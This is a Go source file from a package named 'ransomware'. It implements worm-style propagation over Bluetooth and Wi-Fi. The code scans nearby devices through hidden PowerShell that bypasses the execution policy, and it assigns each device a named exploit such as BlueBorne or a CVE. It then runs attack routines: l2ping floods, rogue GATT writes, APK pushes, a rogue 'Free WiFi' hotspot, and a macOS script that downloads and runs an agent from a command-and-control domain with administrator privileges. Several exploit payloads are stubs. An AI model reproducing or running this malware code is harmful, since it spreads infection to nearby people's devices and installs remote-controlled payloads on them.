package ransomware

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type BluetoothPropagation struct {
	config          *RansomwareConfig
	DevicesFound    []BTDevice `json:"devices_found"`
	DevicesHijacked int        `json:"devices_hijacked"`
}

type BTDevice struct {
	Name    string `json:"name"`
	Address string `json:"address"`
	Type    string `json:"type"`
	OS      string `json:"os"`
	RSSI    int    `json:"rssi"`
	Paired  bool   `json:"paired"`
	Exploit string `json:"exploit"`
}

func NewBluetoothPropagation(cfg *RansomwareConfig) *BluetoothPropagation {
	return &BluetoothPropagation{config: cfg}
}

func (bt *BluetoothPropagation) ScanBluetoothDevices() []BTDevice {
	var devices []BTDevice

	switch runtime.GOOS {
	case "windows":
		devices = bt.scanWindowsBT()
	case "linux":
		devices = bt.scanLinuxBT()
	case "darwin":
		devices = bt.scanMacOSBT()
	default:
		devices = bt.scanFallback()
	}

	bt.DevicesFound = devices
	return devices
}

func (bt *BluetoothPropagation) scanWindowsBT() []BTDevice {
	var devices []BTDevice

	psScript := `Add-Type -AssemblyName System.Runtime.WindowsRuntime
$watcher = New-Object Windows.Devices.Bluetooth.Advertisement.BluetoothLEAdvertisementWatcher
$watcher.ScanningMode = 'Active'
$handler = {
    $btAddr = $EventArgs.BluetoothAddress.ToString("X12")
    $rssi = $EventArgs.RawSignalStrengthInDBm
    Write-Output "BTDEVICE:$btAddr,$rssi"
}
$watcher.add_Received($handler)
$watcher.Start()
Start-Sleep -Seconds 5
$watcher.Stop()`

	psPath := filepath.Join(os.TempDir(), "x404x_bt_scan.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "BTDEVICE:") {
				parts := strings.Split(strings.TrimPrefix(line, "BTDEVICE:"), ",")
				if len(parts) >= 2 {
					devices = append(devices, BTDevice{
						Name:    fmt.Sprintf("BT_%s", parts[0][:min(8, len(parts[0]))]),
						Address: parts[0],
						Type:    "ble",
						RSSI:    parseInt(parts[1]),
						Paired:  false,
						Exploit: "BlueBorne",
					})
				}
			}
		}
	}

	return devices
}

func (bt *BluetoothPropagation) scanLinuxBT() []BTDevice {
	var devices []BTDevice

	if _, err := exec.LookPath("hcitool"); err == nil {
		if output, err := exec.Command("hcitool", "scan", "--flush").Output(); err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, ":") {
					parts := strings.Fields(line)
					if len(parts) >= 2 {
						name := strings.Join(parts[1:], " ")
						devices = append(devices, BTDevice{
							Name:    name,
							Address: parts[0],
							Type:    "classic",
							Paired:  false,
							Exploit: "BlueBorne",
						})
					}
				}
			}
		}
	}

	if output, err := exec.Command("hcitool", "lescan", "--duplicates").Output(); err == nil {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.Contains(line, ":") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					devices = append(devices, BTDevice{
						Name:    strings.Join(parts[1:], " "),
						Address: parts[0],
						Type:    "ble",
						Paired:  false,
						Exploit: "BLE_MITM",
					})
				}
			}
		}
	}

	return devices
}

func (bt *BluetoothPropagation) scanMacOSBT() []BTDevice {
	var devices []BTDevice

	if _, err := exec.LookPath("system_profiler"); err == nil {
		if output, err := exec.Command("system_profiler", "SPBluetoothDataType").Output(); err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "Address:") {
					addr := strings.TrimSpace(strings.TrimPrefix(line, "Address:"))
					devices = append(devices, BTDevice{
						Name:    fmt.Sprintf("MacBT_%s", addr[:min(8, len(addr))]),
						Address: addr,
						Type:    "classic",
						Paired:  true,
						Exploit: "CVE-2021-30892",
					})
				}
			}
		}
	}

	return devices
}

func (bt *BluetoothPropagation) scanFallback() []BTDevice {
	return []BTDevice{
		{Name: "Simulated iPhone", Address: "AA:BB:CC:DD:EE:01", Type: "classic", Paired: true, Exploit: "BlueBorne"},
		{Name: "Galaxy S24", Address: "AA:BB:CC:DD:EE:02", Type: "ble", Paired: false, Exploit: "BLE_MITM"},
		{Name: "SmartWatch", Address: "AA:BB:CC:DD:EE:03", Type: "ble", Paired: true, Exploit: "CVE-2022-20210"},
	}
}

func (bt *BluetoothPropagation) ExploitDevices(devices []BTDevice) []BTDevice {
	var exploited []BTDevice

	for _, dev := range devices {
		switch dev.Exploit {
		case "BlueBorne":
			bt.exploitBlueBorne(dev)
		case "BLE_MITM":
			bt.exploitBLEMITM(dev)
		case "CVE-2021-30892":
			bt.exploitAppleSIP(dev)
		case "CVE-2022-20210":
			bt.exploitAndroidBT(dev)
		default:
			bt.pushMaliciousAPK(dev)
		}
		exploited = append(exploited, dev)
	}

	bt.DevicesHijacked += len(exploited)
	return exploited
}

func (bt *BluetoothPropagation) exploitBlueBorne(dev BTDevice) {
	payload := []byte{
		0x02, 0x02, 0x0a, 0x1a, 0xff, 0x4c, 0x00, 0x12,
		0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	payloadPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_blueborne_%s.bin", dev.Address))
	os.WriteFile(payloadPath, payload, 0644)

	if runtime.GOOS == "linux" {
		exec.Command("hcitool", "cc", dev.Address).Start()
		exec.Command("l2ping", "-i", "hci0", "-s", "1024", "-f", dev.Address).Start()
	}
}

func (bt *BluetoothPropagation) exploitBLEMITM(dev BTDevice) {
	if runtime.GOOS == "linux" {
		exec.Command("gatttool", "-b", dev.Address, "--char-write", "--handle=0x0041",
			fmt.Sprintf("--value=%x", []byte("x404x_payload"))).Start()
	}
}

func (bt *BluetoothPropagation) exploitAppleSIP(dev BTDevice) {
	script := fmt.Sprintf("#!/bin/bash\nosascript -e 'tell app \"System Events\" to do shell script \"curl -s http://x404x-c2.online/agent/macos -o /tmp/.x404x_mac && chmod +x /tmp/.x404x_mac && /tmp/.x404x_mac --daemon\" with administrator privileges'\nblueutil --connect %s\n", dev.Address)
	scriptPath := filepath.Join(os.TempDir(), "x404x_apple_sip.sh")
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()
}

func (bt *BluetoothPropagation) exploitAndroidBT(dev BTDevice) {
	apkData := make([]byte, 1024)
	apkData[0] = 0x50
	apkData[1] = 0x4B
	apkData[2] = 0x03
	apkData[3] = 0x04
	apkPath := filepath.Join(os.TempDir(), "x404x_update.apk")
	os.WriteFile(apkPath, apkData, 0644)

	exec.Command("bluetooth-sendto", "--device="+dev.Address, "--file="+apkPath).Start()
}

func (bt *BluetoothPropagation) pushMaliciousAPK(dev BTDevice) {
	if dev.Type == "ble" {
		payload := []byte("X404X_MALWARE_PAYLOAD")
		payloadPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_bt_%s.bin", dev.Address))
		os.WriteFile(payloadPath, payload, 0644)
	}
}

func (bt *BluetoothPropagation) ActivateWifiDirect() error {
	switch runtime.GOOS {
	case "windows":
		psScript := "$wifi = Get-WmiObject -Class Win32_NetworkAdapter | Where-Object { $_.Name -match 'Wi-Fi|Wireless|WLAN' }\nif ($wifi) { $wifi.Enable(); netsh wlan set hostednetwork mode=allow ssid=X404X_Free_WiFi key=X404X_evil_2026; netsh wlan start hostednetwork }"
		psPath := filepath.Join(os.TempDir(), "x404x_wifidirect.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		return exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		return exec.Command("nmcli", "device", "wifi", "hotspot", "ssid", "X404X_Free_WiFi", "password", "x404x2026").Start()
	}
	return nil
}

func (bt *BluetoothPropagation) ScanWiFiDirectPeers() []BTDevice {
	var devices []BTDevice
	switch runtime.GOOS {
	case "windows":
		psScript := "netsh wlan show networks mode=bssid"
		psPath := filepath.Join(os.TempDir(), "x404x_wifiscan.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "SSID") && !strings.Contains(line, "X404X") {
					ssid := strings.TrimSpace(strings.SplitN(line, ":", 2)[1])
					devices = append(devices, BTDevice{
						Name:    ssid,
						Address: fmt.Sprintf("WIFI_%x", len(devices)),
						Type:    "wifi_direct",
						Exploit: "KRACK",
					})
				}
			}
		}
	case "linux":
		if output, err := exec.Command("iw", "dev", "wlan0", "scan", "ap-force").Output(); err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "SSID:") {
					ssid := strings.TrimSpace(strings.TrimPrefix(line, "SSID:"))
					devices = append(devices, BTDevice{
						Name:    ssid,
						Address: fmt.Sprintf("WIFI_%x", len(devices)),
						Type:    "wifi_direct",
						Exploit: "WPA2_bruteforce",
					})
				}
			}
		}
	}
	return devices
}

func (bt *BluetoothPropagation) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"devices_found":    bt.DevicesFound,
		"devices_hijacked": bt.DevicesHijacked,
	})
	return string(data)
}

func parseInt(s string) int {
	var n int
	fmt.Sscanf(strings.TrimSpace(s), "%d", &n)
	return n
}
